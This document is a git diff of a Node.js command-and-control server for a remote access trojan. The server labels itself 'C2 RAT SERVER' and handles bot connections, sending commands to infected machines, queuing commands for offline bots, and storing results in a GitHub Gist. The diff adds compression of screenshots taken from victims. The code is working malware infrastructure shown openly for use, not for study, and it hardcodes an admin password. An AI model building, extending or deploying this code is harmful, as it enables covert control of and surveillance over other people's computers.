@@ -6,6 +6,7 @@ const bodyParser = require('body-parser');
 const path = require('path');
 const crypto = require('crypto');
 const { Octokit } = require('@octokit/rest');
+const sharp = require('sharp');
 
 const app = express();
 const server = http.createServer(app);
@@ -15,7 +16,9 @@ app.use(cors());
 app.use(bodyParser.json({ limit: '50mb' }));
 app.use(express.static('public'));
 
-// === GITHUB GIST ===
+// ============================================================
+//  GITHUB GIST
+// ============================================================
 const GITHUB_TOKEN = process.env.GITHUB_TOKEN || '';
 const GIST_ID = process.env.GIST_ID || '';
 const GIST_FILENAME = 'c2_db.json';
@@ -35,7 +38,9 @@ if (GITHUB_TOKEN && GIST_ID) {
     console.log('⚠️ GitHub Gist not configured');
 }
 
-// === DATABASE ===
+// ============================================================
+//  DATABASE
+// ============================================================
 const DB = {
     bots: [],
     commands: [],
@@ -46,9 +51,6 @@ const DB = {
 
 const streamCache = new Map();
 
-// ============================================================
-//  GITHUB GIST FUNCTIONS
-// ============================================================
 async function loadFromGist() {
     if (!gistEnabled) return false;
     try {
@@ -98,7 +100,9 @@ async function saveDB() {
     if (gistEnabled) saveToGist().catch(() => {});
 }
 
-// === AUTH ===
+// ============================================================
+//  AUTH
+// ============================================================
 const ADMIN_PASSWORD = 'H3XTEK0';
 const auth = (req, res, next) => {
     const token = req.headers['authorization'];
@@ -108,7 +112,9 @@ const auth = (req, res, next) => {
     next();
 };
 
-// === WEBSOCKET ===
+// ============================================================
+//  WEBSOCKET
+// ============================================================
 const botClients = new Map();
 
 wss.on('connection', (ws, req) => {
@@ -161,36 +167,53 @@ wss.on('connection', (ws, req) => {
                 }
             }
 
-            // === RESULT - FIXED ===
+            // === RESULT - VỚI NÉN ẢNH ===
             else if (data.type === 'result') {
                 console.log(`[RESULT] ${botId}: ${data.cmd_id} -> ${data.status}`);
                 
-                // TÌM COMMAND TRONG DB
-                let cmdIndex = DB.commands.findIndex(c => c.cmd_id === data.cmd_id);
+                let resultData = data.result;
                 
+                // NÉN ẢNH NẾU LÀ SCREENSHOT
+                if (data.result && data.result.startsWith('data:image')) {
+                    try {
+                        const base64Data = data.result.replace(/^data:image\/jpeg;base64,/, '');
+                        const buffer = Buffer.from(base64Data, 'base64');
+                        
+                        const compressed = await sharp(buffer)
+                            .resize(800, null, { fit: 'inside' })
+                            .jpeg({ quality: 40 })
+                            .toBuffer();
+                        
+                        const compressedBase64 = compressed.toString('base64');
+                        resultData = `data:image/jpeg;base64,${compressedBase64}`;
+                        console.log(`[RESULT] ✅ Nén ảnh: ${(buffer.length / 1024).toFixed(1)}KB -> ${(compressed.length / 1024).toFixed(1)}KB`);
+                    } catch (e) {
+                        console.log(`[RESULT] ⚠️ Lỗi nén ảnh: ${e.message}`);
+                    }
+                }
+                
+                // LƯU VÀO DB
+                let cmdIndex = DB.commands.findIndex(c => c.cmd_id === data.cmd_id);
                 if (cmdIndex !== -1) {
-                    // CẬP NHẬT COMMAND HIỆN CÓ
-                    DB.commands[cmdIndex].result = data.result;
+                    DB.commands[cmdIndex].result = resultData;
                     DB.commands[cmdIndex].status = data.status || 'ok';
                     DB.commands[cmdIndex].executed_at = Date.now();
                     console.log(`[RESULT] ✅ Updated command ${data.cmd_id}`);
                 } else {
-                    // NẾU KHÔNG TÌM THẤY, TẠO MỚI (FALLBACK)
-                    console.log(`[RESULT] ⚠️ Command ${data.cmd_id} not found, creating new`);
                     DB.commands.push({
                         bot_id: botId,
                         cmd_id: data.cmd_id,
                         command: data.command || 'unknown',
                         args: '[]',
-                        result: data.result,
+                        result: resultData,
                         status: data.status || 'ok',
                         issued_at: Date.now(),
                         executed_at: Date.now()
                     });
+                    console.log(`[RESULT] ⚠️ Created new command ${data.cmd_id}`);
                 }
                 await saveDB();
                 
-                // GỬI PHẢN HỒI CHO BOT
                 ws.send(JSON.stringify({ 
                     type: 'result_ack', 
                     cmd_id: data.cmd_id,
@@ -267,7 +290,6 @@ app.delete('/api/bots/:bot_id', auth, async (req, res) => {
     res.json({ status: 'deleted' });
 });
 
-// === GỬI LỆNH - FIXED ===
 app.post('/api/command', auth, async (req, res) => {
     const { bot_id, command, args = [] } = req.body;
     if (!bot_id || !command) {
@@ -276,7 +298,6 @@ app.post('/api/command', auth, async (req, res) => {
 
     const cmdId = Date.now() + '-' + crypto.randomBytes(4).toString('hex');
     
-    // LƯU COMMAND VÀO DB
     DB.commands.push({
         bot_id: bot_id,
         cmd_id: cmdId,
@@ -289,13 +310,11 @@ app.post('/api/command', auth, async (req, res) => {
     });
     await saveDB();
 
-    // GỬI LỆNH CHO BOT
     const ws = botClients.get(bot_id);
     if (ws && ws.readyState === WebSocket.OPEN) {
         sendCommand(ws, bot_id, cmdId, command, args);
         res.json({ status: 'sent', cmd_id: cmdId });
     } else {
-        // BOT OFFLINE -> LƯU VÀO PENDING
         DB.pending_commands.push({
             bot_id: bot_id,
             cmd_id: cmdId,
@@ -347,19 +366,16 @@ app.post('/api/command/bulk', auth, async (req, res) => {
     res.json({ results });
 });
 
-// === LẤY KẾT QUẢ - FIXED ===
 app.get('/api/results/:cmd_id', auth, (req, res) => {
     const cmdId = req.params.cmd_id;
     console.log(`[API] Looking for result: ${cmdId}`);
     
-    // Tìm trong commands
     let cmd = DB.commands.find(c => c.cmd_id === cmdId);
     if (cmd) {
         console.log(`[API] Found result: ${cmd.status}`);
         return res.json(cmd);
     }
     
-    // Tìm trong pending commands (fallback)
     const pending = DB.pending_commands.find(p => p.cmd_id === cmdId);
     if (pending) {
         console.log(`[API] Found in pending`);
@@ -375,7 +391,6 @@ app.get('/api/results/:cmd_id', auth, (req, res) => {
     res.json({});
 });
 
-// === LẤY KẾT QUẢ MỚI NHẤT CHO BOT (RAT) ===
 app.get('/api/results/latest/:bot_id', auth, (req, res) => {
     const botId = req.params.bot_id;
     
@@ -517,10 +532,6 @@ app.delete('/api/db', auth, async (req, res) => {
     res.json({ status: 'cleared' });
 });
 
-// ============================================================
-//  GIST STATUS API
-// ============================================================
-
 app.get('/api/gist/status', auth, (req, res) => {
     res.json({
         enabled: gistEnabled,
@@ -566,7 +577,7 @@ async function startServer() {
     
     server.listen(PORT, '0.0.0.0', () => {
         console.log('='.repeat(50));
-        console.log('  ✅ C2 RAT SERVER STARTED (FIXED)');
+        console.log('  ✅ C2 RAT SERVER STARTED');
         console.log(`  Port: ${PORT}`);
         console.log(`  Dashboard: http://localhost:${PORT}/`);
         console.log(`  RAT Control: http://localhost:${PORT}/rat`);
